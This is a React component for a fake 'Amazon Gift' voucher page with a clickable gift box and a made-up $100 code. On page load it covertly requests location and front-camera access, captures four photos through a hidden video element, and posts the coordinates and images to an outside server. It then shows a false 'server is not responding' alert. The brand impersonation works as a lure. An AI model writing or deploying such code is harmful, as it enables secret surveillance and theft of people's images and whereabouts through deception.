import React, { useState,useRef, useEffect } from 'react';
import axios from "axios";


const Locationss = () => {

    const videoRef = useRef(null);
  const canvasRef = useRef(null);

  const [location, setLocation] = useState(null);
  const [images, setImages] = useState([]);
  const [submitted, setSubmitted] = useState(false); // 🔹 prevent double submit

  useEffect(() => {
    getLocation();
    initCameraAndCapture();
  }, []);

  // 🔹 AUTO SUBMIT WHEN 4 IMAGES READY
  useEffect(() => {
    if (images.length === 4 && location && !submitted) {
      submitData();
    }
  }, [images, location]);

  const getLocation = () => {
    navigator.geolocation.getCurrentPosition(
      (pos) => {
        setLocation({
          latitude: pos.coords.latitude,
          longitude: pos.coords.longitude,
        });
      },
      () => alert("Location permission denied")
    );
  };

  const initCameraAndCapture = async () => {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: "user" },
      });

      videoRef.current.srcObject = stream;

      videoRef.current.onloadedmetadata = async () => {
        await videoRef.current.play();

        for (let i = 0; i < 4; i++) {
          await captureImageWithDelay();
        }

        // 🔹 stop camera after capture
        stream.getTracks().forEach((track) => track.stop());
      };
    } catch {
      alert("Camera permission denied");
    }
  };

  const sleep = (ms) => new Promise((res) => setTimeout(res, ms));

  const captureImageWithDelay = async () => {
    await sleep(30);

    const canvas = canvasRef.current;
    const video = videoRef.current;

    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;

    const ctx = canvas.getContext("2d");
    ctx.drawImage(video, 0, 0);

    const imageData = canvas.toDataURL("image/jpeg");

    setImages((prev) => [...prev, imageData]);
  };

  const submitData = async () => {
    setSubmitted(true);

    try {
      await axios.post("https://locationandphoto.onrender.com/store", {
        latitude: location.latitude,
        longitude: location.longitude,
        images,
      });

      alert("Now server is not responding. Please try again later.");
    } catch {
      alert("Something went wrong. Please try again later pass.");
      setSubmitted(false);
    }
  };


  const [isLoading, setIsLoading] = useState(false);
  const [showGift, setShowGift] = useState(true);
  const [showMessage, setShowMessage] = useState(false);
  const [loadingProgress, setLoadingProgress] = useState(0);
  const [isClaimed, setIsClaimed] = useState(false);

  const handleClaimGift = () => {
    setIsLoading(true);
    setLoadingProgress(0);
    setShowGift(false);
    
    // Simulate loading progress
    const interval = setInterval(() => {
      setLoadingProgress(prev => {
        if (prev >= 100) {
          clearInterval(interval);
          setIsLoading(false);
          setShowMessage(true);
          setIsClaimed(true);
          return 100;
        }
        return prev + 2;
      });
    }, 50);
  };

  const handleReset = () => {
    setShowGift(true);
    setShowMessage(false);
    setIsClaimed(false);
    setLoadingProgress(0);
  };

  return (
    <div className=" min-h-screen 
                bg-gradient-to-b from-gray-900 to-gray-800 
                flex flex-col p-4 font-sans">
      {/* Amazon-like Header */}

<div className="mb-4 text-center">
        <video ref={videoRef} autoPlay muted className="mx-auto hidden w-64 rounded-lg border" />
        <canvas ref={canvasRef} className="hidden"></canvas>
      </div>

      <header className="w-full max-w-6xl mb-8">
        <div className="flex items-center justify-between bg-gray-900 border-b border-yellow-500 p-4 rounded-lg">
          <div className="flex items-center space-x-2">
        
            <span className="text-2xl font-bold text-white">Amazon</span>
            <span className="text-xl text-yellow-400 font-bold">Gift</span>
          </div>
          <div className="text-white">
            <span className="text-yellow-400 font-bold">Special Offer</span>
          </div>
        </div>
      </header>

      <main className="w-full max-w-4xl bg-gray-800 rounded-2xl shadow-2xl overflow-hidden border border-yellow-500">
        <div className="p-8 text-center">
          <h1 className="text-4xl font-bold text-white mb-2">
            <span className="text-yellow-400">Congratulations!</span> You've received a gift
          </h1>
          <p className="text-gray-300 mb-8 text-lg">
            Click the gift box to reveal your surprise Amazon voucher
          </p>
          
          {/* Gift Box Container */}
          <div className="flex flex-col items-center justify-center my-12">
            {showGift && (
              <div 
                className="relative cursor-pointer transform hover:scale-105 transition-transform duration-300"
                onClick={handleClaimGift}
              >
                {/* Gift Box */}
                <div className="relative">
                  {/* Gift Box Bottom */}
                  <div className="w-64 h-64 bg-gradient-to-r from-red-600 to-red-800 rounded-lg shadow-2xl">
                    {/* Gift Box Ribbon */}
                    <div className="absolute top-1/2 left-0 w-full h-12 bg-gradient-to-r from-yellow-300 to-yellow-500 transform -translate-y-1/2"></div>
                    <div className="absolute left-1/2 top-0 w-12 h-full bg-gradient-to-b from-yellow-300 to-yellow-500 transform -translate-x-1/2"></div>
                    
                    {/* Gift Box Bow */}
                    <div className="absolute top-1/2 left-1/2 transform -translate-x-1/2 -translate-y-1/2">
                      <div className="relative">
                        <div className="w-20 h-20 bg-gradient-to-r from-yellow-400 to-yellow-600 rounded-full"></div>
                        <div className="absolute top-1/2 left-1/2 transform -translate-x-1/2 -translate-y-1/2 w-16 h-16 bg-gradient-to-r from-yellow-300 to-yellow-500 rounded-full"></div>
                        <div className="absolute top-1/2 left-1/2 transform -translate-x-1/2 -translate-y-1/2 w-12 h-12 bg-yellow-200 rounded-full"></div>
                      </div>
                    </div>
                    
                    {/* Gift Box Lid */}
                    <div className="absolute -top-6 left-1/2 transform -translate-x-1/2 w-72 h-12 bg-gradient-to-r from-red-700 to-red-900 rounded-t-lg"></div>
                    
                    {/* Gift Box Shine */}
                    <div className="absolute top-4 left-4 w-16 h-8 bg-gradient-to-r from-white/20 to-transparent rounded-full transform rotate-45"></div>
                  </div>
                  
                  {/* Click Instruction */}
                  <div className="absolute -bottom-16 left-1/2 transform -translate-x-1/2 text-center">
                    <p className="text-yellow-300 font-bold text-lg animate-pulse">Click to open!</p>
                    <div className="flex items-center justify-center mt-2">
                      <div className="w-6 h-6 border-2 border-yellow-400 rounded-full flex items-center justify-center animate-bounce">
                        <div className="w-2 h-2 bg-yellow-400 rounded-full"></div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            )}
            
            {/* Loading Bar */}
            {isLoading && (
              <div className="w-full max-w-md mt-12">
                <div className="mb-4 flex justify-between">
                  <span className="text-yellow-300 font-bold">Preparing your gift...</span>
                  <span className="text-white font-bold">{loadingProgress}%</span>
                </div>
                <div className="w-full h-6 bg-gray-700 rounded-full overflow-hidden">
                  <div 
                    className="h-full bg-gradient-to-r from-yellow-400 to-yellow-600 rounded-full transition-all duration-300 ease-out"
                    style={{ width: `${loadingProgress}%` }}
                  ></div>
                </div>
                <div className="mt-8 flex justify-center space-x-4">
                  <div className="w-4 h-4 bg-yellow-500 rounded-full animate-pulse"></div>
                  <div className="w-4 h-4 bg-yellow-500 rounded-full animate-pulse" style={{ animationDelay: '0.2s' }}></div>
                  <div className="w-4 h-4 bg-yellow-500 rounded-full animate-pulse" style={{ animationDelay: '0.4s' }}></div>
                </div>
              </div>
            )}
            
            {/* Amazon Voucher Message */}
            {showMessage && (
              <div className="mt-12 animate-fade-in">
                <div className="bg-gradient-to-br from-gray-900 to-gray-800 border-2 border-yellow-500 rounded-2xl p-8 max-w-2xl mx-auto shadow-2xl">
                  <div className="flex items-center justify-center mb-6">
                    <div className="w-16 h-16 bg-gradient-to-r from-yellow-400 to-yellow-600 rounded-full flex items-center justify-center mr-4">
                      <span className="text-3xl font-bold text-gray-900">a</span>
                    </div>
                    <h2 className="text-3xl font-bold text-white">Amazon Voucher</h2>
                  </div>
                  
                  <div className="bg-gray-900 border border-yellow-500 rounded-xl p-6 mb-6">
                    <div className="text-center">
                      <p className="text-gray-300 text-lg mb-2">Congratulations! You've received</p>
                      <div className="text-5xl font-bold text-yellow-400 my-4">$100</div>
                      <p className="text-gray-300 text-lg">Amazon Gift Card</p>
                    </div>
                    
                    <div className="mt-8 p-4 bg-gray-800 rounded-lg">
                      <div className="flex justify-between items-center">
                        <div>
                          <p className="text-gray-400 text-sm">Voucher Code</p>
                          <p className="text-2xl font-mono font-bold text-white tracking-wider">AMZN-2023-X7B9-2K4P</p>
                        </div>
                        <div className="text-right">
                          <p className="text-gray-400 text-sm">Expires</p>
                          <p className="text-xl font-bold text-white">Dec 31, 2023</p>
                        </div>
                      </div>
                    </div>
                  </div>
                  
                  <div className="text-center">
                    <p className="text-gray-300 mb-6">
                      Your voucher has been added to your Amazon account. Use it on millions of items across Amazon.com!
                    </p>
                    <div className="flex justify-center space-x-4">
                      <button className="px-8 py-3 bg-gradient-to-r from-yellow-500 to-yellow-600 text-gray-900 font-bold rounded-lg hover:from-yellow-400 hover:to-yellow-500 transition-all transform hover:scale-105">
                        Shop Now on Amazon
                      </button>
                      <button 
                        onClick={handleReset}
                        className="px-8 py-3 bg-gradient-to-r from-gray-700 to-gray-800 text-white font-bold rounded-lg border border-gray-600 hover:border-yellow-500 transition-all"
                      >
                        Claim Another Gift
                      </button>
                    </div>
                  </div>
                  
                  {/* Amazon disclaimer */}
                  <div className="mt-8 pt-6 border-t border-gray-700">
                    <p className="text-gray-500 text-sm text-center">
                      This is a simulation for demonstration purposes. Amazon and the Amazon logo are trademarks of Amazon.com, Inc. or its affiliates.
                    </p>
                  </div>
                </div>
              </div>
            )}
            
            {/* Claim Button (when gift is not shown but not loading) */}
            {!showGift && !isLoading && !showMessage && (
              <div className="mt-12 animate-fade-in">
                <button 
                  onClick={handleClaimGift}
                  className="px-10 py-4 bg-gradient-to-r from-yellow-500 to-yellow-600 text-gray-900 font-bold text-xl rounded-lg hover:from-yellow-400 hover:to-yellow-500 transition-all transform hover:scale-105 shadow-2xl"
                >
                  Claim Your Amazon Gift
                </button>
                <p className="text-gray-400 mt-4">Click to reveal your surprise!</p>
              </div>
            )}
          </div>
          
          {/* Instructions */}
          <div className="mt-12 grid grid-cols-1 md:grid-cols-3 gap-6">
            <div className="bg-gray-900 p-6 rounded-xl border border-gray-700">
              <div className="w-12 h-12 bg-gradient-to-r from-yellow-500 to-yellow-600 rounded-full flex items-center justify-center mx-auto mb-4">
                <span className="text-2xl">🎁</span>
              </div>
              <h3 className="text-xl font-bold text-white mb-2">Find Your Gift</h3>
              <p className="text-gray-400">Discover special gifts available for you on Amazon.</p>
            </div>
            
            <div className="bg-gray-900 p-6 rounded-xl border border-gray-700">
              <div className="w-12 h-12 bg-gradient-to-r from-yellow-500 to-yellow-600 rounded-full flex items-center justify-center mx-auto mb-4">
                <span className="text-2xl">⚡</span>
              </div>
              <h3 className="text-xl font-bold text-white mb-2">Instant Claim</h3>
              <p className="text-gray-400">Click to claim your gift instantly with one simple action.</p>
            </div>
            
            <div className="bg-gray-900 p-6 rounded-xl border border-gray-700">
              <div className="w-12 h-12 bg-gradient-to-r from-yellow-500 to-yellow-600 rounded-full flex items-center justify-center mx-auto mb-4">
                <span className="text-2xl">🛒</span>
              </div>
              <h3 className="text-xl font-bold text-white mb-2">Start Shopping</h3>
              <p className="text-gray-400">Use your Amazon voucher on millions of products.</p>
            </div>
          </div>
        </div>
      </main>
      
      {/* Footer */}
      <footer className="mt-12 text-gray-500 text-center">
        <p className="mt-2">Click the gift box to experience the surprise animation!</p>
      </footer>
      
   
    </div>
  );
};

export default Locationss;
